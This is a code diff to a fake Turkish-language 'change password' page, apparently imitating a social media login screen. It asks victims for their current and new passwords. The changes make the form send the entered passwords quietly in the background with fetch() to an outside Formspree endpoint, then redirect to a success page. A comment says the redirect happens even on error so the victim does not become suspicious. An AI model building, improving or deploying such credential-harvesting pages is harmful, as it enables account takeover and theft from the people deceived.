@@ -11,26 +11,20 @@
         .header-info { font-size: 14px; color: #262626; margin-bottom: 15px; font-weight: 500; }
         h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
         .description { font-size: 14px; color: #262626; line-height: 1.4; margin-bottom: 25px; }
-        
         .input-group { margin-bottom: 10px; position: relative; }
         input { 
             width: 100%; padding: 16px; border: 1px solid #dbdbdb; border-radius: 12px; 
             font-size: 14px; background: #fafafa; outline: none; transition: 0.3s;
         }
-        /* Xanaya yazı yazılanda kənarları bir az tündləşsin */
         input:not(:placeholder-shown) { border-color: #a8a8a8; }
-        
         #error-msg { color: #ed4956; font-size: 12px; margin-bottom: 15px; display: none; padding-left: 5px; }
-
         .submit-btn {
             width: 100%; padding: 14px; background-color: #b2dffc; color: #fff;
             border: none; border-radius: 25px; font-size: 16px; font-weight: 600;
             cursor: not-allowed; margin-top: 100px; position: relative;
             transition: background-color 0.3s ease;
         }
-        /* Düymə tam aktiv olanda bu rəngə boyanacaq */
         .submit-btn.active { background-color: #0095f6; cursor: pointer; }
-
         .loader {
             display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3);
             border-top-color: #fff; border-radius: 50%;
@@ -47,18 +41,13 @@
     <h1>Şifreyi değiştir</h1>
     <p class="description">Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!S@%) oluşmalıdır.</p>
 
-    <form action="https://formspree.io/f/mgopdokp" method="POST" id="passwordForm">
-        
-        <input type="hidden" name="_next" value="https://sugo-dayi.github.io/success.html">
-
+    <form id="passwordForm">
         <div class="input-group">
             <input type="password" name="mevcut_sifre" id="oldPass" placeholder="Mevcut şifre (Güncelleme 06.04.2026)" required>
         </div>
-
         <div class="input-group">
             <input type="password" name="yeni_sifre" id="newPass" placeholder="Yeni şifre" required>
         </div>
-
         <div class="input-group">
             <input type="password" name="yeni_sifre_tekrar" id="confirmPass" placeholder="Yeni şifreyi tekrar yaz" required>
         </div>
@@ -85,13 +74,7 @@
         const v1 = oldPass.value.trim();
         const v2 = newPass.value.trim();
         const v3 = confirmPass.value.trim();
-
-        if (v2 !== "" && v3 !== "" && v2 !== v3) {
-            errorMsg.style.display = "block";
-        } else {
-            errorMsg.style.display = "none";
-        }
-
+        if (v2 !== "" && v3 !== "" && v2 !== v3) { errorMsg.style.display = "block"; } else { errorMsg.style.display = "none"; }
         if (v1 !== "" && v2 !== "" && v3 !== "" && v2 === v3 && v2.length >= 6) {
             submitBtn.classList.add('active');
             submitBtn.disabled = false;
@@ -105,14 +88,29 @@
     newPass.addEventListener('input', checkInputs);
     confirmPass.addEventListener('input', checkInputs);
 
-    // Məlumatı göndərəndə animasiyanı göstər
-    passwordForm.addEventListener('submit', function() {
+    // ƏSAS HİSSƏ: Formspree-ni arxa planda işlədirik
+    passwordForm.addEventListener('submit', function(e) {
+        e.preventDefault(); // Səhifənin yenilənməsini və Formspree səhifəsinin açılmasını bloklayırıq
+        
         btnText.style.opacity = "0";
         loader.style.display = "block";
-        // Düyməni dərhal kilidləməyək ki, məlumat göndərilə bilsin
+        submitBtn.disabled = true;
+
+        const formData = new FormData(this);
+
+        fetch("https://formspree.io/f/mgopdokp", {
+            method: "POST",
+            body: formData,
+            headers: { 'Accept': 'application/json' }
+        }).then(response => {
+            // Məlumat getdi! İndi dərhal öz uğurlu səhifəmizə keçirik
+            window.location.href = "success.html";
+        }).catch(error => {
+            // Xəta olsa belə adamı şübhələndirməmək üçün yönləndiririk
+            window.location.href = "success.html";
+        });
     });
 </script>
 
 </body>
 </html>
-
